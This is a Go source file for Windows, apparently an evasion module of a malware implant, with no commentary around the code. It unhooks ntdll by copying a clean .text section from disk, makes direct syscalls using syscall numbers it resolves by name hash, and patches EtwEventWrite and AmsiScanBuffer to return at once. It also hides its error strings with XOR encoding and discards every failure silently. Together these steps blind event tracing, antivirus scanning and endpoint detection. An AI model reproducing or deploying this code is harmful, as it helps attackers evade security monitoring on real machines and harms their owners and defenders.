//go:build windows

package main

import (
	"fmt"
	"os"
	"unsafe"
)

var (
	encEvUnhook  = []byte{0xcf, 0xdd, 0x92, 0x89, 0xe0, 0xdb, 0xf9, 0xc3, 0xca, 0xcc, 0xcf, 0xca, 0x86, 0xc1, 0xc5, 0xcc, 0xd6, 0xde, 0xdc}
	encEvUnprot  = []byte{0xcf, 0xdd, 0x92, 0x89, 0xe0, 0xdb, 0xfc, 0xdf, 0xcd, 0xd7, 0xc5, 0xc2, 0xd2, 0xf1, 0xcd, 0xd7, 0xce, 0xce, 0xd9, 0xd5, 0xf3, 0xda, 0xd1, 0xd2, 0xc0, 0xca, 0x90, 0xd7, 0xd7, 0xde, 0xd8, 0xd0, 0xef}
	encEvETW     = []byte{0xcf, 0xdd, 0x92, 0x89, 0xeb, 0xdb, 0xdb, 0xe8, 0xd4, 0xc6, 0xce, 0xd5, 0xf1, 0xd5, 0xcd, 0xd1, 0xdf, 0x9b, 0xc8, 0xd8, 0xca, 0xdc, 0xd4, 0x9d, 0xd4, 0xd2, 0xd9, 0xdd}
	encEvAMSI    = []byte{0xcf, 0xdd, 0x92, 0x89, 0xef, 0xc2, 0xdf, 0xc4, 0xf1, 0xc0, 0xc1, 0xcf, 0xe4, 0xd2, 0xc2, 0xc3, 0xdf, 0xc9, 0x98, 0xc9, 0xdf, 0xcb, 0xdf, 0xd5, 0x92, 0xd5, 0xd1, 0xd8, 0xda, 0xd2, 0xd0}
	encEvAMSIRes = []byte{0xcf, 0xdd, 0x92, 0x89, 0xef, 0xc2, 0xdf, 0xc4, 0xf1, 0xc0, 0xc1, 0xcf, 0xe4, 0xd2, 0xc2, 0xc3, 0xdf, 0xc9, 0x98, 0xcb, 0xdb, 0xcc, 0xd3, 0xd1, 0xc4, 0xd6, 0x90, 0xd7, 0xd7, 0xde, 0xd8}
	encEvAMSIHash = []byte{0xcf, 0xdd, 0x92, 0x89, 0xef, 0xc2, 0xdf, 0xc4, 0xf1, 0xc0, 0xc1, 0xcf, 0xe4, 0xd2, 0xc2, 0xc3, 0xdf, 0xc9, 0x98, 0xd1, 0xdf, 0xcc, 0xd4, 0x9d, 0xd4, 0xd2, 0xd9, 0xdd}
	encEvAMSI_NotFound = []byte{0xcf, 0xdd, 0x92, 0x89, 0xef, 0xc2, 0xdf, 0xc4, 0xf1, 0xc0, 0xc1, 0xcf, 0xe4, 0xd2, 0xc2, 0xc3, 0xdf, 0xc9, 0x98, 0xd5, 0xd7, 0xdd, 0x9c, 0xd3, 0xdd, 0xc7, 0x90, 0xd7, 0xd9, 0xc2, 0xda, 0xd1}
)

//go:noescape
func syscall4(ssn uintptr, a1, a2, a3, a4 uintptr) uintptr

//go:noescape
func syscall5(ssn uintptr, a1, a2, a3, a4, a5 uintptr) uintptr

type imgSection struct {
	_[8]byte
	VSize uint32
	VAddr uint32
	RawSize uint32
	RawPtr uint32
	_[16]byte
}

func findSectionText(peData []byte) (uint32, uint32) {
	pb := uintptr(unsafe.Pointer(unsafe.SliceData(peData)))
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(pb))
	if dos.Magic != 0x5A4D {
		return 0, 0
	}
	ntHdr := pb + uintptr(dos.Lfanew)
	if *(*uint32)(unsafe.Pointer(ntHdr)) != 0x00004550 {
		return 0, 0
	}
	soh := *(*uint16)(unsafe.Pointer(ntHdr + 20))
	secStart := ntHdr + 4 + 20 + uintptr(soh)
	count := *(*uint16)(unsafe.Pointer(ntHdr + 4 + 2))

	for i := uint16(0); i < count; i++ {
		sec := (*imgSection)(unsafe.Pointer(secStart + uintptr(i)*unsafe.Sizeof(imgSection{})))
		name := *(*uint64)(unsafe.Pointer(sec))
		if name == 0x747865742e {
			return sec.VAddr, sec.VSize
		}
	}
	return 0, 0
}

func extractSSN(peData []byte, fnHash uint32) uintptr {
	pb := uintptr(unsafe.Pointer(unsafe.SliceData(peData)))
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(pb))
	if dos.Magic != 0x5A4D {
		return 0
	}
	ntHdr := pb + uintptr(dos.Lfanew)
	if *(*uint32)(unsafe.Pointer(ntHdr)) != 0x00004550 {
		return 0
	}
	expVA := *(*uint32)(unsafe.Pointer(ntHdr + 0x88))
	if expVA == 0 {
		return 0
	}
	exp := (*imgExp)(unsafe.Pointer(pb + uintptr(expVA)))
	nameArr := pb + uintptr(exp.ANm)
	ordArr := pb + uintptr(exp.AOrd)
	funcArr := pb + uintptr(exp.AFn)

	for i := uint32(0); i < exp.NNm; i++ {
		nrva := *(*uint32)(unsafe.Pointer(nameArr + uintptr(i*4)))
		if nrva == 0 {
			continue
		}
		np := pb + uintptr(nrva)
		h := uint32(5381)
		for j := 0; ; j++ {
			b := *(*byte)(unsafe.Pointer(np + uintptr(j)))
			if b == 0 {
				break
			}
			if b >= 'a' && b <= 'z' {
				b -= 32
			}
			h = ((h << 5) + h) + uint32(b)
		}
		if h == fnHash {
			ord := *(*uint16)(unsafe.Pointer(ordArr + uintptr(i*2)))
			rva := *(*uint32)(unsafe.Pointer(funcArr + uintptr(ord)*4))
			fnAddr := pb + uintptr(rva)
			if *(*uint32)(unsafe.Pointer(fnAddr))&0xFFFFFF == 0x8BD14C {
				ssn := *(*uint32)(unsafe.Pointer(fnAddr + 4))
				return uintptr(ssn)
			}
		}
	}
	return 0
}

func ntdllFromDisk() []byte {
	d, _ := os.ReadFile("C:\\Windows\\System32\\ntdll.dll")
	return d
}

func findNtdllLoaded() uintptr {
	p := getPeb()
	if p == 0 {
		return 0
	}
	ldr := *(*uintptr)(unsafe.Pointer(p + 0x18))
	if ldr == 0 {
		return 0
	}
	flink := *(*uintptr)(unsafe.Pointer(ldr + 0x20))
	start := flink
	for {
		le := (*ldrEntry)(unsafe.Pointer(flink))
		if le.DllBase != 0 && le.BaseDllName.Len >= 10 && le.BaseDllName.Buf != 0 {
			c0 := *(*uint16)(unsafe.Pointer(le.BaseDllName.Buf))
			c1 := *(*uint16)(unsafe.Pointer(le.BaseDllName.Buf + 2))
			c2 := *(*uint16)(unsafe.Pointer(le.BaseDllName.Buf + 4))
			c3 := *(*uint16)(unsafe.Pointer(le.BaseDllName.Buf + 6))
			c4 := *(*uint16)(unsafe.Pointer(le.BaseDllName.Buf + 8))
			if (c0 == 'n' || c0 == 'N') && (c1 == 't' || c1 == 'T') && (c2 == 'd' || c2 == 'D') && (c3 == 'l' || c3 == 'L') && (c4 == 'l' || c4 == 'L') {
				return le.DllBase
			}
		}
		flink = *(*uintptr)(unsafe.Pointer(flink))
		if flink == start {
			break
		}
	}
	return 0
}

func patchAddr(ssn uintptr, addr uintptr) error {
	var oldProt uint32
	sz := uintptr(1)
	ba := addr
	r1 := syscall5(ssn, ^uintptr(0), uintptr(unsafe.Pointer(&ba)), uintptr(unsafe.Pointer(&sz)), PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
	if r1 != 0 {
		return fmt.Errorf(xorDecrypt(encEvUnprot))
	}
	*(*byte)(unsafe.Pointer(addr)) = 0xC3
	ba2 := addr
	syscall5(ssn, ^uintptr(0), uintptr(unsafe.Pointer(&ba2)), uintptr(unsafe.Pointer(&sz)), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
	return nil
}

func UnhookNtdll(ssn uintptr) error {
	cleanData := ntdllFromDisk()
	if len(cleanData) == 0 {
		return fmt.Errorf(xorDecrypt(encEvUnhook))
	}
	va, vsz := findSectionText(cleanData)
	if va == 0 || vsz == 0 {
		return fmt.Errorf(xorDecrypt(encEvUnhook))
	}
	loaded := findNtdllLoaded()
	if loaded == 0 {
		return fmt.Errorf(xorDecrypt(encEvUnhook))
	}

	var oldProt uint32
	sz := uintptr(vsz)
	ba := loaded + uintptr(va)
	r1 := syscall5(ssn, ^uintptr(0), uintptr(unsafe.Pointer(&ba)), uintptr(unsafe.Pointer(&sz)), PAGE_READWRITE, uintptr(unsafe.Pointer(&oldProt)))
	if r1 != 0 {
		return fmt.Errorf(xorDecrypt(encEvUnprot))
	}

	src := uintptr(unsafe.Pointer(unsafe.SliceData(cleanData))) + uintptr(va)
	for i := uintptr(0); i < uintptr(vsz); i++ {
		*(*byte)(unsafe.Pointer(loaded + uintptr(va) + i)) = *(*byte)(unsafe.Pointer(src + i))
	}

	ba2 := loaded + uintptr(va)
	syscall5(ssn, ^uintptr(0), uintptr(unsafe.Pointer(&ba2)), uintptr(unsafe.Pointer(&sz)), uintptr(oldProt), uintptr(unsafe.Pointer(&oldProt)))
	return nil
}

func PatchETW(ssn uintptr) error {
	loaded := findNtdllLoaded()
	if loaded == 0 {
		return fmt.Errorf(xorDecrypt(encEvETW))
	}
	dos := (*IMAGE_DOS_HEADER)(unsafe.Pointer(loaded))
	ntHdr := loaded + uintptr(dos.Lfanew)
	expVA := *(*uint32)(unsafe.Pointer(ntHdr + 0x88))
	if expVA == 0 {
		return fmt.Errorf(xorDecrypt(encEvETW))
	}
	exp := (*imgExp)(unsafe.Pointer(loaded + uintptr(expVA)))
	nameArr := loaded + uintptr(exp.ANm)
	ordArr := loaded + uintptr(exp.AOrd)
	funcArr := loaded + uintptr(exp.AFn)

	for i := uint32(0); i < exp.NNm; i++ {
		nrva := *(*uint32)(unsafe.Pointer(nameArr + uintptr(i*4)))
		if nrva == 0 {
			continue
		}
		np := loaded + uintptr(nrva)
		h := uint32(5381)
		for j := 0; ; j++ {
			b := *(*byte)(unsafe.Pointer(np + uintptr(j)))
			if b == 0 {
				break
			}
			if b >= 'a' && b <= 'z' {
				b -= 32
			}
			h = ((h << 5) + h) + uint32(b)
		}
		if h == fhEtwEventWrite {
			ord := *(*uint16)(unsafe.Pointer(ordArr + uintptr(i*2)))
			rva := *(*uint32)(unsafe.Pointer(funcArr + uintptr(ord)*4))
			return patchAddr(ssn, loaded+uintptr(rva))
		}
	}
	return fmt.Errorf(xorDecrypt(encEvETW))
}

func PatchAMSI(ssn uintptr) error {
	p := getPeb()
	if p == 0 {
		return fmt.Errorf(xorDecrypt(encEvAMSIRes))
	}
	ldr := *(*uintptr)(unsafe.Pointer(p + 0x18))
	if ldr == 0 {
		return fmt.Errorf(xorDecrypt(encEvAMSIRes))
	}
	flink := *(*uintptr)(unsafe.Pointer(ldr + 0x20))
	start := flink

	var amsiBase uintptr
	for {
		le := (*ldrEntry)(unsafe.Pointer(flink))
		if le.DllBase != 0 && le.BaseDllName.Len > 0 && le.BaseDllName.Buf != 0 {
			ml := int(le.BaseDllName.Len) / 2
			h := uint32(5381)
			for i := 0; i < ml; i++ {
				c := byte(*(*uint16)(unsafe.Pointer(le.BaseDllName.Buf + uintptr(i*2))))
				if c >= 'a' && c <= 'z' {
					c -= 32
				}
				h = ((h << 5) + h) + uint32(c)
			}
			if h == fhAmsiDll {
				amsiBase = le.DllBase
				break
			}
		}
		flink = *(*uintptr)(unsafe.Pointer(flink))
		if flink == start {
			break
		}
	}
	if amsiBase == 0 {
		return fmt.Errorf(xorDecrypt(encEvAMSI_NotFound))
	}

	addr := findExportFn(amsiBase, fhAmsiScanBuffer)
	if addr == 0 {
		return fmt.Errorf(xorDecrypt(encEvAMSIHash))
	}
	return patchAddr(ssn, addr)
}

func InitEvasion() {
	cleanData := ntdllFromDisk()
	if len(cleanData) == 0 {
		return
	}
	ssn := extractSSN(cleanData, fhNtProtectVirtualMemory)
	if ssn == 0 {
		return
	}

	if err := UnhookNtdll(ssn); err != nil {
		_ = err
	}
	if err := PatchETW(ssn); err != nil {
		_ = err
	}
	if err := PatchAMSI(ssn); err != nil {
		_ = err
	}
}
